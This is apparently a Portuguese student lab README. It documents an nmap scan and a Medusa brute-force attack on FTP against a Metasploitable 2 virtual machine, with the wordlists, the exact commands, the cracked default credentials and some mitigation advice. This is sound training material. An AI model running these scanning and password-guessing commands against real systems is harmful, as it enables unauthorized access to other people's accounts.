

\# 🧠 Projeto: Ataques de Força Bruta com Kali Linux e Medusa



\## 🎯 Objetivo

Este projeto tem como objetivo simular ataques de força bruta em serviços vulneráveis utilizando Kali Linux e a ferramenta Medusa, em um ambiente controlado com Metasploitable 2. A proposta é entender como esses ataques funcionam, validar acessos e propor medidas de mitigação.



---



\## 🖥️ Ambiente de Testes



\- \*\*Máquina Atacante\*\*: Kali Linux (VirtualBox)

\- \*\*Máquina Alvo\*\*: Metasploitable 2

\- \*\*Rede\*\*: Host-Only (comunicação direta entre as VMs)



---



\## 🔍 Descoberta de Serviços com Nmap



Antes de iniciar os ataques, foi realizada uma varredura com Nmap para identificar os serviços ativos na máquina alvo:



```bash

nmap -p 21,22,80,445,139 192.168.56.101

```



\### Resultado:

\- FTP (vsftpd 2.3.4) – Porta 21

\- SSH (OpenSSH 4.7p1) – Porta 22

\- HTTP (Apache 2.2.8) – Porta 80

\- SMB (Samba smbd 3.X - 4.X) – Portas 139 e 445



📸 \*Captura de tela disponível em\* `images/nmap\_scan.jpeg`



---



\## 🔐 Ataque de Força Bruta com Medusa (FTP)



\### Wordlists utilizadas:

\- `users.txt`:

&nbsp; ```

&nbsp; 123456

&nbsp; password

&nbsp; qwerty

&nbsp; msfadmin

&nbsp; ```

\- `pass.txt`:

&nbsp; ```

&nbsp; 123456

&nbsp; password

&nbsp; qwerty

&nbsp; msfadmin

&nbsp; ```



Comando executado:

```bash

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

```



Resultado:

\- A ferramenta Medusa obteve sucesso ao encontrar as credenciais válidas:

&nbsp; - \*\*Usuário\*\*: `msfadmin`

&nbsp; - \*\*Senha\*\*: `msfadmin`



\- O acesso foi validado com login via FTP:



bash

ftp 192.168.56.101

Name: msfadmin

Password: msfadmin

Login successful.

```



📸 \*Captura de tela disponível em\* `images/ftp\_success.jpeg`



---



\## 📁 Estrutura do Projeto



```

kali-medusa-bruteforce/

├── wordlists/

│   ├── users.txt

│   └── pass.txt

├── scripts/

│   └── comandos.sh

├── images/

│   ├── ftp\_success.jpeg

│   └── nmap\_scan.jpeg

└── README.md

```



---



Recomendações de Mitigação



\- Implementar autenticação multifator (MFA)

\- Limitar tentativas de login por IP (rate limiting)

\- Monitorar logs de acesso e gerar alertas

\- Utilizar senhas fortes e únicas

\- Desativar serviços desnecessários em produção



---



&nbsp;Aprendizados



\- Medusa é uma ferramenta poderosa para testes de força bruta em diversos protocolos.

\- Metasploitable 2 é ideal para simulações seguras de vulnerabilidades reais.

\- A importância de boas práticas de segurança para evitar acessos indevidos.

